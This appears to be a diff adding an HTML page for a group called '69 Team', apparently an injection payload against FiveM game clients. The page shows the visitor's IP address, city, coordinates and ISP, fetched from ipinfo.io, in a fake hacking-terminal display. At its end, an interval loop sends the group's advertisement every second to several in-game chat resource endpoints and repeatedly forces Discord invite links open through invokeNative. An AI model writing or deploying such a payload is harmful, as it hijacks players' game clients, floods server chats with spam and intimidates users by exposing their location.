@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>69 Team | Discord.gg/96t</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            position: relative;
+            padding: 20px;
+        }
+        
+        .grid-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(to right, rgba(80, 80, 80, 0.1) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(80, 80, 80, 0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            z-index: -1;
+            opacity: 0.5;
+        }
+        
+        .scan-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, transparent, rgba(200, 200, 200, 0.8), transparent);
+            animation: scan 4s linear infinite;
+            z-index: 100;
+            box-shadow: 0 0 15px rgba(200, 200, 200, 0.5);
+        }
+        
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100vh; }
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 900px;
+            background: rgba(30, 30, 30, 0.8);
+            border: 1px solid #444;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            margin: 20px 0;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #444;
+            position: relative;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -1px;
+            left: 25%;
+            width: 50%;
+            height: 2px;
+            background: linear-gradient(to right, transparent, #888, transparent);
+        }
+        
+        .team-name {
+            font-size: 2.5rem;
+            color: #aaa;
+            text-shadow: 0 0 10px rgba(200, 200, 200, 0.5);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .discord-info {
+            font-size: 1.5rem;
+            color: #888;
+            margin: 15px 0;
+        }
+        
+        .discord-link {
+            color: #7289da;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            display: inline-block;
+            padding: 8px 15px;
+            border: 1px solid #7289da;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        
+        .discord-link:hover {
+            background: rgba(114, 137, 218, 0.2);
+            box-shadow: 0 0 15px rgba(114, 137, 218, 0.4);
+        }
+        
+        .terminal {
+            background: rgba(20, 20, 20, 0.7);
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .terminal::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(transparent 50%, rgba(100, 100, 100, 0.05) 50%);
+            background-size: 100% 4px;
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .command {
+            margin: 15px 0;
+            overflow: hidden;
+            white-space: nowrap;
+            animation: typing 3.5s steps(40, end);
+            color: #aaa;
+            position: relative;
+            padding-left: 20px;
+        }
+        
+        .command::before {
+            content: ">";
+            position: absolute;
+            left: 0;
+            color: #888;
+        }
+        
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        
+        .system-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .info-item {
+            background: rgba(40, 40, 40, 0.7);
+            padding: 15px;
+            border-radius: 6px;
+            border-left: 3px solid #666;
+            transition: all 0.3s ease;
+        }
+        
+        .info-item:hover {
+            border-left-color: #7289da;
+            background: rgba(50, 50, 50, 0.7);
+        }
+        
+        .info-item i {
+            margin-right: 10px;
+            color: #7289da;
+        }
+        
+        .loading-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #333;
+            margin: 25px 0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, #444, #666, #444);
+            animation: loading 5s forwards;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            background: rgba(150, 150, 150, 0.3);
+            border-radius: 50%;
+            opacity: 0;
+            animation: particle-float 15s infinite linear;
+        }
+        
+        @keyframes particle-float {
+            0% {
+                transform: translateY(0) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.5;
+            }
+            90% {
+                opacity: 0.3;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px);
+                opacity: 0;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .team-name {
+                font-size: 2rem;
+            }
+            
+            .discord-info {
+                font-size: 1.2rem;
+            }
+            
+            .system-info {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    <div class="scan-line"></div>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1 class="team-name">69 TEAM</h1>
+            <div class="discord-info">
+                <i class="fab fa-discord"></i> 
+                <span>ديسكورد السيرفر: </span>
+                <a href="https://discord.gg/96t" class="discord-link">discord.gg/96t</a>
+            </div>
+        </div>
+        
+        <div class="terminal">
+            <div class="command">جارٍ الاتصال بالنظام...</div>
+            
+            <div class="loading-bar">
+                <div class="progress"></div>
+            </div>
+            
+            <div class="command">جارٍ جمع معلومات النظام...</div>
+            
+            <div class="system-info">
+                <div class="info-item">
+                    <i class="fas fa-network-wired"></i>
+                    <strong>IP: </strong><span id="ip">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-city"></i>
+                    <strong>المدينة: </strong><span id="city">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-map-marked"></i>
+                    <strong>المنطقة: </strong><span id="region">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-globe"></i>
+                    <strong>الدولة: </strong><span id="country">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <strong>الموقع: </strong><span id="loc">Loading...</span>
+                </div>
+                <div class="info-item">
+                    <i class="fas fa-server"></i>
+                    <strong>المزود: </strong><span id="org">Loading...</span>
+                </div>
+            </div>
+            
+            <div class="command">>> اكتمل تحميل معلومات النظام <<</div>
+        </div>
+        
+        <div class="footer">
+            <p>69 Team &copy; 2025 | نظام مراقبة وتحكم</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // إنشاء الجسيمات العائمة
+            createParticles();
+            
+            // جلب معلومات النظام بعد تأخير لمحاكاة التحميل
+            setTimeout(function() {
+                fetch('https://ipinfo.io/json')
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('ip').textContent = data.ip || 'غير معروف';
+                        document.getElementById('city').textContent = data.city || 'غير معروف';
+                        document.getElementById('region').textContent = data.region || 'غير معروف';
+                        document.getElementById('country').textContent = data.country || 'غير معروف';
+                        document.getElementById('loc').textContent = data.loc || 'غير معروف';
+                        document.getElementById('org').textContent = data.org || 'غير معروف';
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP info:', error);
+                        document.querySelectorAll('.info-item span').forEach(span => {
+                            span.textContent = 'فشل في التحميل';
+                        });
+                    });
+            }, 4000);
+            
+            // تأثير الكتابة للأوامر
+            const commands = document.querySelectorAll('.command');
+            commands.forEach((cmd, index) => {
+                cmd.style.animationDelay = (index * 1.5) + 's';
+            });
+        });
+        
+        function createParticles() {
+            const container = document.getElementById('particles');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                const size = Math.random() * 4 + 1;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                
+                particle.style.animationDuration = `${Math.random() * 15 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                container.appendChild(particle);
+            }
+        }
+         const msg = `69 Team , Lester X Dark .gg/96t 🧥`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/96T");
+window.invokeNative("openUrl", "https://discord.gg/96t");
+window.invokeNative("openUrl", "https://discord.gg/96t");
+window.invokeNative("openUrl", "https://discord.gg/96t");
+}, 1000);
+    </script>
+    </script>
+    </script>
+</body>
+</html>
